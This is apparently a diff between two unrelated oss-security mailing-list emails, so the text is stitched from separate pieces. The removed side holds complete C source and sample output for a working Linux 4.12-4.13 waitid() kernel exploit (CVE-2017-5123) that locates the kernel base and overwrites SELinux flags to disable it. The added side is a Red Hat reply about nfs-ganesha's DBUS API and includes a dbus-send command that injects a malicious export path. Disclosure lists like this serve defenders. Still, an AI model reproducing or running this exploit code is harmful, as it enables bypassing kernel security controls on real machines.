@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3975" "Wednesday" "25" "October" "2017" "12:42:41" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>" "155" "[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()" nil nil nil "10" "2017102510:42:41" "[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()" (number mark "U       up201407890@ Oct 25  155/3975  " thread-indent "\"[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1807" "Sunday" "6" "November" "2016" "17:52:31" "-0500" "Siddharth Sharma" "siddharth@redhat.com" "<1232346907.5838823.1478472751323.JavaMail.zimbra@redhat.com>" "44" "Re: [oss-security] nfsd-ganesha allows anyone to call into DBUS?" nil nil nil "11" "2016110622:52:31" "[oss-security] nfsd-ganesha allows anyone to call into DBUS?" (number mark "U       siddharth@re Nov  6   44/1807  " thread-indent "\"Re: [oss-security] nfsd-ganesha allows anyone to call into DBUS?\"\n") "<20160912095353.GB17469@suse.de>" ("<20160912095353.GB17469@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 22366 invoked by uid 550); 25 Oct 2017 10:50:33 -0000
+Received: (qmail 17489 invoked by uid 550); 6 Nov 2016 23:13:05 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,172 +12,64 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 18313 invoked from network); 25 Oct 2017 10:43:32 -0000
-Message-ID: <20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>
-Date: Wed, 25 Oct 2017 12:42:41 +0200
-From: up201407890@alunos.dcc.fc.up.pt
+Received: (qmail 8101 invoked from network); 6 Nov 2016 22:52:54 -0000
+Date: Sun, 6 Nov 2016 17:52:31 -0500 (EST)
+From: Siddharth Sharma <siddharth@redhat.com>
 To: oss-security@lists.openwall.com
+Cc: matt@linuxbox.com, philippe deniel <philippe.deniel@cea.fr>
+Message-ID: <1232346907.5838823.1478472751323.JavaMail.zimbra@redhat.com>
+In-Reply-To: <20160912095353.GB17469@suse.de>
+References: <20160912095353.GB17469@suse.de>
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
-	boundary="=_5gufam68hvok"
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: 7bit
-User-Agent: Internet Messaging Program (IMP) H3 (4.2)
-X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
-Subject: [oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling
-	access_ok()
+X-Originating-IP: [10.36.4.142]
+X-Mailer: Zimbra 8.0.6_GA_5922 (ZimbraWebClient - FF49 (Linux)/8.0.6_GA_5922)
+Thread-Topic: nfsd-ganesha allows anyone to call into DBUS?
+Thread-Index: D6EXK3No+nL28tXv5unESXUbP6n5Wg==
+Subject: Re: [oss-security] nfsd-ganesha allows anyone to call into DBUS?
 
---=_5gufam68hvok
-Content-Type: text/plain;
-	charset=ISO-8859-1;
-	DelSp="Yes";
-	format="flowed"
-Content-Disposition: inline
-Content-Transfer-Encoding: 7bit
+Hi,
 
-Hello,
+Which version of nfs-ganesha did you use ? Can you be more specific
+I tried to reproduce this quite a lot of times in my testing environment
+But I always get 
 
-I've written a quick exploit for that vulnerability.
-Instead of using it for malicious purposes, I use it to actually  
-increase my systems security.
+~]$  dbus-send --print-reply --system --dest=org.ganesha.nfsd  /org/ganesha/nfsd/ExportMgr org.ganesha.nfsd.exportmgr.AddExport  string:$GANESHA_DIR/exports/export.$VOL.conf string:"EXPORT(Path=/$SERV_MALICIOUS_CONTENT)"
+Error org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type="method_call", sender=":1.159" (uid=1000 pid=3852 comm="dbus-send --print-reply --system --dest=org.ganesh") 
 
-$ id
-uid=1000
-$ ./a.out
-[+] Leak size=144 bytes
-[+] Got kernel base: 0xffffffffb5200000
-[+] Got selinux_enforcing: 0xffffffffb611cc90
-[+] Got selinux_enabled: 0xffffffffb5eb1350
-[+] Overwriting selinux_enforcing...
-[+] Overwriting selinux_enabled...
-[+] SELinux disabled!
-
-Enjoy,
-Federico Bento.
-
-PS: It's just a joke :)
+anything you did differently ?
+-----------------------------------------------------------------
+Siddharth Sharma / Red Hat Product Security / Key ID : 0xD9F6489A      
+Fingerprint  :  6F04 C684 A49C E4CE 8148 E841 CD6F 8E55 D9F6 489A
 
 
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
+----- Original Message -----
+From: "Sebastian Krahmer" <krahmer@suse.com>
+To: oss-security@lists.openwall.com
+Cc: matt@linuxbox.com, "philippe deniel" <philippe.deniel@cea.fr>
+Sent: Monday, September 12, 2016 3:23:53 PM
+Subject: [oss-security] nfsd-ganesha allows anyone to call into DBUS?
 
+Hi
 
---=_5gufam68hvok
-Content-Type: text/x-csrc;
-	charset=UTF-8;
-	name="selinux.c"
-Content-Disposition: attachment;
-	filename="selinux.c"
-Content-Transfer-Encoding: quoted-printable
+The nfs-ganesha (userspace nfsd) offers a dbus API to control/admin
+the nfsd via cmdline tools and some qt+python code.
 
-/*
- * 4.12-4.13 waitid() infoleak and write-not-what-only-where - Yes, I just =
-coined that term
- *=20
- * Federico Bento
- * @uid1000 on twitter
- *
- *=20
- * This quick, dirty and ugly exploit will actually give the system increas=
-ed security
- * That's why it's beautiful :)
- *
- *
- * $ id
- * uid=3D1000
- * $ ./a.out
- * [+] Leak size=3D144 bytes
- * [+] Got kernel base: 0xffffffffb5200000
- * [+] Got selinux_enforcing: 0xffffffffb611cc90
- * [+] Got selinux_enabled: 0xffffffffb5eb1350
- * [+] Overwriting selinux_enforcing...
- * [+] Overwriting selinux_enabled...
- * [+] SELinux disabled!
- *
- *
- * Thanks to Andr=C3=A9 Baptista (@0xACB) and all xSTF, spender for the inf=
-oleak
- *=20
- * Shout-out to all .pt :)
- *
- * Still relevant: https://www.grsecurity.net/~spender/pics/mac_security_se=
-samestreet.jpg
- *
- */
+The default dbus config seems to allow anyone to connect to
+it and invoke methods. The code at least does not check any polkit
+authorizations or dbus sender (at a first look). Am I missing something? If I dont,
+the DBUS API should be declared experimental and disabled by default,
+since there are some methods which would allow users to gain root.
 
-#include <stdio.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
-#include <stdlib.h>
-#include <sys/resource.h>
-#include <syscall.h>
+https://github.com/nfs-ganesha/nfs-ganesha/
+https://github.com/nfs-ganesha/nfs-ganesha/wiki/Dbusinterface
 
-/* offsets might differ, kernel was custom compiled */
-#define OFFSET_TO_BASE 0x1aec98
-#define SELINUX_ENFORCING 0xf1cc90
-#define SELINUX_ENABLED 0xcb1350
+Sebastian
 
-int main(void)
-{
-	int pid, pid2, pid3;
-	struct rusage rusage =3D { };
-	unsigned long *p;
-	char *selinux_enforcing, *selinux_enabled;
-	pid =3D fork();
-	if (pid > 0) {
-		syscall(__NR_waitid, P_PID, pid, NULL, WEXITED|WNOHANG|__WNOTHREAD, &rusa=
-ge);
-		printf("[+] Leak size=3D%d bytes\n", sizeof(rusage));
-		for (p =3D (unsigned long *)&rusage;
-		     p < (unsigned long *)((char *)&rusage + sizeof(rusage));
-		     p++) {
-			if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000) {
-				p =3D (unsigned long *)(*p - OFFSET_TO_BASE); // spender's wouldn't act=
-ually work when KASLR was enabled
-				printf("[+] Got kernel base: %p\n", p);
-				selinux_enforcing =3D (char *)p + SELINUX_ENFORCING;
-				printf("[+] Got selinux_enforcing: %p\n", selinux_enforcing);
-				selinux_enabled =3D (char *)p + SELINUX_ENABLED;
-				printf("[+] Got selinux_enabled: %p\n", selinux_enabled);
-				break;
-			}
-		}
-		if(p < (unsigned long *)0xffffffff00000000 || p > (unsigned long *)0xffff=
-ffffff000000)
-			exit(-1);
-	} else if (pid =3D=3D 0) {
-		sleep(1);
-		exit(0);
-	}
-	pid2 =3D fork();
-	if (pid2 > 0) {
-		printf("[+] Overwriting selinux_enforcing...\n");
-		if (syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(selinux_enforcing - 2)=
-, WEXITED|WNOHANG|__WNOTHREAD, NULL) < 0) {
-			printf("[-] Failed!\n");
-			exit(1);
-		}
-	} else if (pid2 =3D=3D 0) {
-		sleep(1);
-		exit(0);
-	}
+-- 
 
-	pid3 =3D fork();
-        if (pid3 > 0) {
-                printf("[+] Overwriting selinux_enabled...\n");
-                if (syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(selinux_=
-enabled - 2), WEXITED|WNOHANG|__WNOTHREAD, NULL) < 0) {
-                        printf("[-] Failed!\n");
-                        exit(1);
-                }
-                printf("[+] SELinux disabled!\n");
-                exit(0);
-        } else if (pid3 =3D=3D 0) {
-                sleep(1);
-                exit(0);
-        }
-	return 0;
-}=
-
---=_5gufam68hvok--
+~ perl self.pl
+~ $_='print"\$_=\47$_\47;eval"';eval
+~ krahmer@suse.com - SuSE Security Team
 
